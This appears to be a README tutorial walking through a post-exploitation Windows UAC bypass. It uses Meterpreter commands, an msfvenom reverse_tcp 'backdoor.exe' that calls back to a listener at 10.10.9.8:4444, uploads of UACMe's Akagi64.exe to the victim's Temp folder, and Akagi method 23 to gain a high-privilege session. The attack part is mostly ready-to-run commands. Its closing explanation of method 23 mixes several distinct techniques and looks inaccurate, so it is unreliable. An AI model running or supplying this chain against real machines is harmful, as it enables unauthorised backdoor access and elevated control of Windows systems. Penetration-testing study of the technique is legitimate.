# Privilege-Escalation-Windows-UAC-Bypass
Let's see how to perform Privilege Escalation(Windows) UAC Bypass
# Introduction of Windows UAC Bypass
Windows UAC, or User Account Control, is a security feature that helps prevent unauthorized changes to the operating system and the user’s files and folders. It does this by asking the user to confirm or deny any action that requires administrator-level permission. UAC was introduced in Windows Vista and is still used in Windows 10 and Windows 11.


## Privilage Escalation(Windows) bypass UAC
### **We have an initial access, let's check that we can't elevate to the high privilage**
 1. **getuid**
 2. **sysinfo** <br>
<img src="info.png" width=60% height="auto"><br>
### **Try to get high privilage**
 1. **ps -S explorer.exe**
 2. **migrate** (pid explorer)
 3. **getsystem** <br>
<img src="elevate1.png" width=60% height="auto"><br>
### **Check if the user is a member of the Administrators group, we need this condition for bypass UAC, we will use UACMe tool to bypass it**
 1. **shell**
 2. **net localgroup administrators** <br>
<img src="group.png" width=60% height="auto"><br>
### **we generate a malicous payload with msvenom to gain administrator user privileges**
 1. **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.9.8 (myip) LPORT=4444 -f exe > 'backdoor.exe'**
 2. **file backdoor.exe** <br>
<img src="venom.png" width=60% height="auto"><br>
### **Upload the Akagi64.exe and backdoor.exe to the Target system**
 1. **return to the Meterpreter session**
 2. **cd C:\\Users\\admin\\AppData\\Local\\Temp**
 3. **upload /root/Desktop/tools/UACME/Akagi64.exe**
 4. **upload /root/backdoor.exe**
 5. **ls** <br>
<img src="upload.png" width=60% height="auto"><br>
### **Run a multi handler with metasploit**
 1. **use exploit/multi/handler**
 2. **set PAYLOAD windows/meterpreter/reverse_tcp**
 3. **set LHOST 10.10.9.8**
 4. **set LPORT 4444**
 5. **exploit** <br>
<img src="handler.png" width=60% height="auto"><br>
### **Enter again in the shell and run Akagi with the method 23**
 1. **Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe** <br>
<img src="akagi.png" width=60% height="auto"><br>
### **In the handler window we have successfully gained an meterpreter session with high privilege access**
 1. **getsystem**<br>
<img src="high.png" width=60% height="auto"><br><br>

## What's Akagi Method 23?
**Akagi Method number 23 is one of the techniques that UACMe can use to elevate privileges. It involves creating a symbolic link from a trusted folder (such as C:\Windows\System32) to a malicious executable, and then launching a legitimate program that loads a DLL from the trusted folder. The symbolic link will redirect the DLL loading to the malicious executable, which will run with high integrity level.** <br>
**This method was originally discovered by James Forshaw, a security researcher who found several UAC bypasses in Windows. He published a proof-of-concept code that used the Event Viewer application to trigger the DLL loading from the trusted folder. UACMe adapted this code and added more applications that can be used for the same purpose, such as ComputerDefaults, Fodhelper, and sdclt.** <br>
**This method works on Windows 7, 8, 8.1, and 10, but it requires administrator privileges to create the symbolic link. It also depends on the configuration of UAC, as some settings may block the elevation or prompt the user for confirmation.**



#Author
<b>Xiao Li Savio Feng</b>
